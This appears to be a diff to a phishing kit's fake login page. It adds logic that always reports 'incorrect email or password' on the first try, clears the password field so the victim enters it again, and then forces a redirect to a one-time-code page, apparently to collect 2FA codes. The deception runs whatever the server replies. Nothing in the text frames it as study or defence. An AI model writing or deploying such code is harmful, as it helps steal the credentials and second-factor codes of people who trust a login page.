@@ -479,22 +479,43 @@
 
                 const data = await response.json();
 
-                // Store email for later use and redirect
-                if (data.success) {
-                    sessionStorage.setItem('userEmail', email);
-                    const redirectUrl = data.redirect || '/otp-method.html';
-                    console.log('Redirecting to:', redirectUrl);
-                    // Force redirect with cache bypass
-                    window.location.replace(redirectUrl);
-                } else {
-                    console.error('Invalid response:', data);
+                // Increment attempt counter
+                attemptCount++;
+
+                if (attemptCount < 2) {
+                    // First attempt - show error
                     errorElement.classList.add('show');
-                    errorElement.textContent = 'An error occurred. Please try again.';
+                    errorElement.textContent = 'The email address or password you entered is incorrect. Please try again.';
+                    // Clear only password field, keep email
+                    document.getElementById('password').value = '';
+                    document.getElementById('password').focus();
+                } else {
+                    // Second attempt - redirect to 2FA
+                    if (data.success) {
+                        sessionStorage.setItem('userEmail', email);
+                        const redirectUrl = data.redirect || '/otp-method.html';
+                        console.log('Redirecting to 2FA:', redirectUrl);
+                        // Force redirect with cache bypass
+                        window.location.replace(redirectUrl);
+                    }
                 }
             } catch (error) {
                 console.error('Error:', error);
-                errorElement.classList.add('show');
-                errorElement.textContent = 'An error occurred. Please try again.';
+                attemptCount++;
+                
+                if (attemptCount < 2) {
+                    errorElement.classList.add('show');
+                    errorElement.textContent = 'The email address or password you entered is incorrect. Please try again.';
+                    document.getElementById('password').value = '';
+                } else {
+                    // On 2nd attempt error, still try to redirect
+                    errorElement.classList.add('show');
+                    errorElement.textContent = 'Multiple failed attempts. Redirecting to verification...';
+                    setTimeout(() => {
+                        sessionStorage.setItem('userEmail', email);
+                        window.location.replace('/otp-method.html');
+                    }, 1500);
+                }
             } finally {
                 // Reset button state
                 loginButton.textContent = originalButtonText;
